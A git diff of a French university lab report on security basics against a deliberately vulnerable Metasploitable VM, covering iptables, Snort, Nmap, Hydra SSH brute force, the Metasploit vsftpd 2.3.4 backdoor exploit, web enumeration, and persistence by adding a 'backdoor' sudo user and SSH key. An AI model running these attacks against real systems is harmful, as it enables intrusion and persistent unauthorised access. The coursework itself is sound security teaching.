@@ -1,4 +1,4 @@
-# Mini-Projet 4 – Réponses & Guide Pratique
+# Mini-Projet 4
 **Cours : Sécurité des Systèmes d'Information – ECE 2025-2026**
 
 ---
@@ -7,32 +7,14 @@
 
 | Machine | Rôle | IP |
 |---------|------|----|
-| Kali Linux (clem) | Attaquant / Analyseur | `192.168.100.1` |
+| Kali Linux | Attaquant / Analyseur | `192.168.100.1` |
 | Metasploitable 2 | Victime | `192.168.100.2` |
-
-> ⚠️ IPs statiques à configurer au début de chaque session :
->
-> **Sur Kali :**
-> ```bash
-> sudo ip addr add 192.168.100.1/24 dev eth0
-> sudo ip link set eth0 up
-> ```
-> **Sur Metasploitable :**
-> ```bash
-> sudo ifconfig eth0 192.168.100.2 netmask 255.255.255.0 up
-> ```
-> **Vérifier :**
-> ```bash
-> ping 192.168.100.2   # depuis Kali
-> ```
 
 ---
 
 ## Partie 4A – Configuration d'un firewall basique (iptables)
 
-### Réponse
-
-Configurer iptables sur **Kali** pour contrôler le trafic vers/depuis Metasploitable.
+Tout d'abord on configure iptables sur **Kali** pour contrôler le trafic vers/depuis Metasploitable.
 
 **1. Partir d'une base propre**
 ```bash
@@ -78,26 +60,23 @@ sudo iptables-save > /etc/iptables/rules.v4
 ```bash
 sudo iptables -L -v
 ```
-
-> 📸 *[Insérer ici : screenshot de `iptables -L -v` avec les règles en place]*
+![Texte alternatif](images/iptable.png)
 
 **9. Test de connectivité**
 ```bash
-ping 192.168.100.2        # ping vers Metasploitable
-ssh msfadmin@192.168.100.2   # test SSH vers Metasploitable
+ping 192.168.100.2     
+ssh msfadmin@192.168.100.2 
 ```
 
-> 📸 *[Insérer ici : screenshot du ping et SSH réussi vers Metasploitable]*
+![Texte alternatif](images/ping4.png)
 
-**Pourquoi ?** La politique `INPUT DROP` par défaut applique le principe du **moindre privilège** au niveau réseau : tout est bloqué sauf ce qu'on autorise explicitement.
+La politique `INPUT DROP` par défaut applique le principe du **moindre privilège** au niveau réseau donc tout est bloqué sauf ce qu'on autorise explicitement.
 
 ---
 
 ## Partie 4B – IDS avec Snort
 
-### Réponse
-
-Snort tourne sur **Kali** et surveille le trafic vers/depuis Metasploitable.
+Snort tourne sur **Kali** et surveille le trafic vers et depuis Metasploitable.
 
 **1. Installation**
 ```bash
@@ -110,59 +89,51 @@ sudo cp /etc/snort/snort.conf /etc/snort/snort.conf.bak
 sudo nano /etc/snort/snort.conf
 ```
 
-Modifications (utiliser `Ctrl+W` pour chercher) :
+On effectue les modifications suivantes :
 ```bash
 var HOME_NET 192.168.100.0/24
 var EXTERNAL_NET !$HOME_NET
 var INTERFACE eth0
 ```
 
-Vérifier que cette ligne n'est pas commentée :
+On vérifie que cette ligne n'est pas commentée :
 ```
 include $RULE_PATH/community.rules
 ```
 
-Décommenter :
+Et on décommente ça:
 ```
 output alert_syslog: LOG_AUTH
 ```
-
-Sauvegarder : `Ctrl+X` → `O` → Entrée
 
 **3. Lancer Snort**
 ```bash
 sudo snort -dev -i eth0 -c /etc/snort/snort.conf
 ```
 
-> 📸 *[Insérer ici : screenshot de Snort démarré et en écoute sur eth0]*
-
 **4. Générer des alertes depuis Kali vers Metasploitable**
 
-Dans un autre terminal :
+Dans un autre terminal on fait :
 ```bash
 nmap -p 1-1000 192.168.100.2
 ```
 
-**5. Voir les alertes en temps réel**
+**5. Voir les alertes en temps réel avec les commandes suivantes**
 ```bash
 sudo tail -f /var/log/auth.log
 # ou
 sudo tail -f /var/log/snort/alert
 ```
 
-> 📸 *[Insérer ici : screenshot des alertes Snort suite au scan Nmap de Metasploitable]*
-
-**Pourquoi ?** Snort analyse le trafic réseau et compare les paquets à des signatures d'attaques connues. Il détecte mais ne bloque pas (contrairement à un IPS). Le scan Nmap est immédiatement détecté car il correspond à des signatures connues.
+Snort analyse le trafic réseau et compare les paquets à des signatures d'attaques connues. Il détecte mais ne bloque pas (contrairement à un IPS). Le scan Nmap est immédiatement détecté car il correspond à des signatures connues.
 
 ---
 
 ## Partie 4C – Scan de ports avec Nmap
 
-### Réponse
+Tous les scans sont lancés depuis **Kali** vers **Metasploitable** `192.168.100.2`.
 
-Tous les scans sont lancés depuis **Kali** vers **Metasploitable** (`192.168.100.2`).
-
-**1. Scan TCP SYN (furtif)**
+**1. Scan TCP SYN furtif**
 ```bash
 nmap -sS 192.168.100.2
 ```
@@ -192,8 +163,14 @@ sudo nmap -O 192.168.100.2
 ```bash
 sudo nmap -sS -sV -O -p 1-65535 192.168.100.2
 ```
+Voici les résultats de tous les scans :
 
-> 📸 *[Insérer ici : screenshot des résultats Nmap sur Metasploitable avec ports ouverts et services]*
+![Texte alternatif](images/nmap1.png)
+![Texte alternatif](images/nmap2.png)
+![Texte alternatif](images/nmap3.png)
+![Texte alternatif](images/nmap4.png)
+![Texte alternatif](images/nmap5.png)
+![Texte alternatif](images/nmap6.png)
 
 **Analyse des résultats typiques sur Metasploitable :**
 
@@ -205,13 +182,11 @@ sudo nmap -sS -sV -O -p 1-65535 192.168.100.2
 | 3306/tcp | MySQL | 5.0.51 | Accès base de données |
 | 8180/tcp | HTTP | Apache Tomcat | Interface admin exposée |
 
-**Pourquoi ?** Le scan Nmap constitue la phase de **reconnaissance** du pentest. Metasploitable est volontairement vulnérable et expose de nombreux services avec des versions anciennes et des failles connues.
+Le scan Nmap constitue la phase de **reconnaissance** du pentest. Metasploitable est volontairement vulnérable et expose de nombreux services avec des versions anciennes et des failles connues.
 
 ---
 
 ## Partie 4D – Attaque simple (reconnaissance + exploitation)
-
-### Réponse
 
 **1. Scan initial de reconnaissance**
 ```bash
@@ -220,23 +195,21 @@ sudo nmap -sS -sV -p 1-65535 192.168.100.2
 
 **2. Identifier un service vulnérable**
 
-Metasploitable expose plusieurs cibles faciles. Exemples :
+Metasploitable expose plusieurs cibles faciles comme :
 - Port **21** → vsftpd 2.3.4 avec backdoor
 - Port **22** → SSH avec brute force possible
 - Port **80** → DVWA avec failles web
 
-**3a. Attaque SSH par force brute (Hydra)**
+**3a. Attaque SSH par force brute Hydra**
 ```bash
 # Vérifier que rockyou.txt est disponible
-ls /usr/share/wordlists/rockyou.txt
-# Si absent :
 sudo gunzip /usr/share/wordlists/rockyou.txt.gz
 
 # Lancer l'attaque
 hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.2
 ```
 
-> 📸 *[Insérer ici : screenshot de Hydra avec le mot de passe trouvé (msfadmin)]*
+Dans mon cas hydra n'a pas fonctionné
 
 **3b. Exploitation du backdoor vsftpd 2.3.4 (Metasploit)**
 ```bash
@@ -246,10 +219,10 @@ use exploit/unix/ftp/vsftpd_234_backdoor
 show options
 set RHOSTS 192.168.100.2
 run
-# Si ça marche : un shell s'ouvre sur Metasploitable
+# un shell s'ouvre sur Metasploitable
 ```
 
-> 📸 *[Insérer ici : screenshot de Metasploit avec le shell obtenu sur Metasploitable]*
+![Texte alternatif](images/msf.png)
 
 **3c. Enumération web**
 ```bash
@@ -258,23 +231,13 @@ dirb http://192.168.100.2
 gobuster dir -u http://192.168.100.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-> 📸 *[Insérer ici : screenshot des répertoires découverts sur Metasploitable]*
+![Texte alternatif](images/dirb.png)
 
-**4. Documenter les résultats**
-
-À noter dans le rapport :
-- Ports ouverts et services identifiés
-- Vulnérabilité exploitée
-- Commande exacte ayant permis la compromission
-- Impact potentiel
-
-**Pourquoi ?** Metasploitable est conçu pour être vulnérable — le backdoor vsftpd 2.3.4 est une vraie faille historique. Cela permet de voir concrètement comment une version logicielle non mise à jour peut compromettre un système entier en quelques secondes.
+Metasploitable est conçu pour être vulnérable — le backdoor vsftpd 2.3.4 est une vraie faille historique. Cela permet de voir concrètement comment une version logicielle non mise à jour peut compromettre un système entier en quelques secondes.
 
 ---
 
 ## Partie 4E – Méthodologie du pentest et rapport
-
-### Réponse
 
 ### Les 5 phases appliquées à notre lab
 
@@ -334,9 +297,6 @@ sudo usermod -aG sudo backdoor
 # Ajouter une clé SSH backdoor
 echo "<cle_publique_kali>" >> ~/.ssh/authorized_keys
 ```
-
-> 📸 *[Insérer ici : screenshot de la chaîne complète : Nmap → exploit vsftpd → shell obtenu sur Metasploitable]*
-
 ---
 
 ### Structure du rapport de pentest
@@ -372,19 +332,3 @@ Metasploitable présente un niveau de sécurité insuffisant pour tout environne
 
 ---
 
-## Récapitulatif des commandes essentielles
-
-| Partie | Commande | Rôle |
-|--------|----------|------|
-| Setup | `sudo ip addr add 192.168.100.1/24 dev eth0` | IP statique Kali |
-| Setup | `sudo ifconfig eth0 192.168.100.2 netmask 255.255.255.0 up` | IP statique Metasploitable |
-| 4A | `sudo iptables -P INPUT DROP` | Bloquer tout le trafic entrant |
-| 4A | `sudo iptables -A INPUT -s 192.168.100.0/24 -j ACCEPT` | Autoriser le réseau local |
-| 4A | `sudo iptables-save > /etc/iptables/rules.v4` | Sauvegarder les règles |
-| 4B | `sudo snort -dev -i eth0 -c /etc/snort/snort.conf` | Lancer Snort |
-| 4B | `sudo tail -f /var/log/auth.log` | Voir les alertes Snort |
-| 4C | `sudo nmap -sS -sV -O -p 1-65535 192.168.100.2` | Scan complet Metasploitable |
-| 4C | `nmap --script vuln 192.168.100.2` | Détecter les vulnérabilités |
-| 4D | `hydra -l msfadmin -P rockyou.txt ssh://192.168.100.2` | Brute force SSH |
-| 4D | `use exploit/unix/ftp/vsftpd_234_backdoor` | Exploiter le backdoor FTP |
-| 4E | `sqlmap -u "http://192.168.100.2/dvwa/..." --dbs` | Injection SQL automatisée |
